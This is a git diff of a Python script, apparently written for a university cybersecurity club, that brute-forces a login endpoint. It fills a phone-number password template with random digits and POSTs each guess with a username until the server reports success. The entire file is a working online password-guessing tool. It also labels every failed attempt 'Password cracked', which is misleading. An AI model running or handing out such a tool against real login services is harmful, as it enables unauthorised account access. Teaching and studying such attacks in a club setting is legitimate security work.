@@ -2,15 +2,18 @@ import requests as req
 import argparse
 import random
 from logo import showLogo
+from time import sleep
+from prettytable import PrettyTable
 
 def generatePhone(template: str):
   rng = [str(random.randint(0, 9)) for _ in range(template.count("*"))]
+  size = len(rng)
 
   for number in rng:
     template = template.replace("*", number, 1)
-  
-  return template
 
+  return template, 10**size
+  
 def argumentParser():
   parser = argparse.ArgumentParser(description="Bruteforce example for MSU Cybersecurity Club")
 
@@ -38,13 +41,6 @@ def argumentParser():
   )
 
   parser.add_argument(
-    "-v",
-    "--verbose",
-    action="store_true",
-    help="Verbose bruteforce"
-  )
-
-  parser.add_argument(
     "url",
     metavar="URL",
     type=str,
@@ -56,6 +52,8 @@ def argumentParser():
 def main():
   showLogo()
   argument = argumentParser()
+  print("Please waiting...")
+  sleep(3)
   argUrl: str  = argument.url
   argMethod: str = argument.method
   argUsername: str = argument.username
@@ -66,27 +64,43 @@ def main():
       res = req.get(argUrl)
       print(res.json())
     except req.exceptions.MissingSchema:
-      print("It isn't URL!")
+      print("It isn't URL!!")
+    except req.exceptions.JSONDecodeError:
+      print("Support only JSON response")
 
   if argMethod.lower() == "post":
     memo = []
-    while True:
-      password = generatePhone(argPassword)
+    count = 1
 
-      if password in memo:
-        continue
+    try:
+      while True:
+        password, size = generatePhone(argPassword)
 
-      jBody = {"username": argUsername, "password": password}
-      res = req.post(argUrl, json=jBody)
-      
-      if argument.verbose:
-        print(password)
-      memo.append(password)
+        if count > size:
+          print("These password aren't correct")
+          break
 
-      if res.status_code == 200:
-        print(f"Password is: {password}")
-        break
-      
+        if password in memo:
+          continue
+
+        jBody = {"username": argUsername, "password": password}
+        res = req.post(argUrl, json=jBody)
+        
+        if int(res.json()["status"]) == 200:
+          p = PrettyTable(["Correct Password"])
+          p.add_row([password])
+          
+          print(p)
+          break
+        
+        print(f"Password cracked: {password}", f"Attempted: {count}")
+        memo.append(password)
+        count += 1
+
+    except req.exceptions.MissingSchema:
+      print("It isn't URL!!")
+    except req.exceptions.JSONDecodeError:
+      print("Support only JSON response")
 
 if __name__ == "__main__":
   main()
